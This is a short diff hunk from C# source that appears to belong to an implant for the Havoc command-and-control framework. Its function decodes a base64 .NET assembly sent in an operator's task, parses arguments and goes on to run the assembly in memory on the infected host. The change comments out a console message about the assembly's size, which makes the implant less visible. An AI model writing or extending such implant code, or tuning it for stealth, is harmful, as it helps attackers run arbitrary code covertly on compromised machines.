@@ -18,7 +18,7 @@ namespace HavocImplant.AgentFunctions
         public static void Run(Implant agent, string taskInfo, int taskId)
         {
             byte[] assembly_bytes = Convert.FromBase64String(taskInfo.Split(new char[] { ';' }, 2)[0].Substring(5));
-            Console.WriteLine($"Assembly is {assembly_bytes.Length} bytes long");
+            //Console.WriteLine($"Assembly is {assembly_bytes.Length} bytes long");
             string[] args = taskInfo.Split(new char[] { ';' }, 2)[1].Split(' ');
             string output = "";
             try
